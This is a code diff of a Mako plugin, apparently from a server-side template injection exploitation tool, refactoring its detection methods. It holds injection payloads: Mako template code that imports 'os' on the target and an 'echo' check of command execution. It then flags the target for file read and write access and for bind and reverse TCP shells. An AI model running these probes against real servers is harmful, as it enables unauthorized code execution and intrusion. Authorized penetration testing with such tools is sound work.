@@ -2,7 +2,7 @@ from core import languages
 from core.plugin import Plugin
 from utils.loggers import log
 from utils import rand
-
+import re
 
 class Mako(Plugin):
 
@@ -82,37 +82,36 @@ class Mako(Plugin):
 
     ]
 
-    def detect_engine(self):
+    language = 'python'
 
-        randA = rand.randstr_n(2)
-        randB = rand.randstr_n(2)
+    def rendered_detected(self):
 
-        payload = '${"%s".join("%s")}' % (randA, randB)
-        expected = randA.join(randB)
+        self.set('engine', self.plugin.lower())
+        self.set('language', self.language)
 
-        if expected == self.render(payload):
-            self.set('language', 'python')
-            self.set('engine', 'mako')
-            self.set('evaluate', 'python')
-            self.set('execute', True)
+        os = self.render("""<% import sys, os; x=os.name; y=sys.platform; %>${x}-${y}""")
+        if os and re.search('^[\w-]+$', os):
+            self.set('os', os)
+            self.set('evaluate', self.language)
+            self.set('write', True)
+            self.set('read', True)
+
+            expected_rand = str(rand.randint_n(2))
+            if expected_rand == self.execute('echo %s' % expected_rand):
+                self.set('execute', True)
+                self.set('tcp_shell', True)
+                self.set('reverse_tcp_shell', True)
 
 
-    def detect_eval(self):
+    def blind_detected(self):
 
-        # Check eval capabilities only if engine has been found
-        if not self.get('engine'):
-            return
+        self.set('engine', self.plugin.lower())
+        self.set('language', self.language)
 
-        payload = """<% import sys, os; x=os.name; y=sys.platform; %>${x}-${y}"""
-        self.set('evaluate', 'python')
-        self.set('os', self.render(payload))
+        # Blind has been detected so code has been already evaluated
+        self.set('evaluate_blind', self.language)
 
-    def detect_blind_engine(self):
-
-        if not self.get('blind'):
-            return
-
-        self.set('language', 'python')
-        self.set('engine', 'mako')
-        self.set('evaluate', 'python')
-        self.set('execute', True)
+        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
+            self.set('execute_blind', True)
+            self.set('tcp_shell', True)
+            self.set('reverse_tcp_shell', True)
